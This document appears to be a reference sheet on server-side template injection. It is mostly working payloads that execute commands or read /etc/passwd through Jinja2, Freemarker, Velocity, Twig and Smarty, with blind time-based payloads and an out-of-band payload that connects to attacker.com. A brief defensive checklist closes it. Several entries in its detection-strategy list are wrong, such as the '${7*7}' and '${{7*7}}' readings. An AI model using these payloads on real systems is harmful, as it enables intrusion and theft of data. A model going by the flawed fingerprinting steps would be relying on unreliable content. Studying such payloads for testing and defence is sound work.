# Server-Side Template Injection (SSTI): 2026 Reference

## Template Engines

### Jinja2 (Python/Flask)
```python
# Detection
{{7*7}}
# → 49
```
```python
# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__['os'].popen('id').read()}}
{{joiner.__init__.__globals__['os'].popen('id').read()}}
{{namespace.__init__.__globals__['os'].popen('id').read()}}
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Freemarker (Java)
```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign art="freemarker.template.utility.ObjectConstructor"?new()>${art("java.lang.ProcessBuilder","id").start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)
```velocity
#set($e="exp")#set($a=$e.getClass().forName("java.lang.Runtime"))#set($b=$a.getMethod("getRuntime"))#set($c=$b.invoke(null))#set($d=$c.exec("id"))$d  // Or use $e in payload
#set($str=$class.inspect("java.lang.String").split(";"))
```

### Twig (PHP)
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('exec')}}
{{['cat /etc/passwd']|filter('system')}}
```

### Smarty (PHP)
```smarty
{system('id')}
{php}echo shell_exec('id');{/php}
{$smarty.version}
```

## Blind SSTI

Detection via time-based payloads:
```jinja2
{% if ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('sleep 5') %}a{% endif %}
```

Out-of-band:
```jinja2
{{config.__class__.__init__.__globals__['__builtins__']['__import__']('socket').socket().connect(('attacker.com',80))}}
```

## Detection Strategy
1. Input: `{{7*7}}` → output 49 = Jinja2/Twig/Smarty
2. Input: `${{7*7}}` → output 49 = Jinja2 auto-escaping
3. Input: `${7*7}` → output 77 = **Not** SSTI (arithmetic expansion)
4. Input: `#{7*7}` → output 49 = Ruby/ERB
5. Input: `*{7*7}` → output 49 = Freemarker (legacy)
6. Input: `${7*7}` → output 49 = Freemarker
7. Input: `{{7*'7'}}` → output 7777777 = Jinja2 (string multiplication)

## Tooling
- **tplmap**: Automated SSTI detection and exploitation
- **Burp SSTI Scanner**: Passive/active scanning
- **SSTImap** (kacperszurek): Multi-engine exploitation

## Defensive Checklist
1. Never allow user input in template strings — use template files with strict parameters
2. Sandbox template execution (Jinja2 sandbox, Freemarker TemplateModel)
3. Disable dangerous built-ins: `os`, `subprocess`, `eval`, `exec`
4. Use auto-escaping and output encoding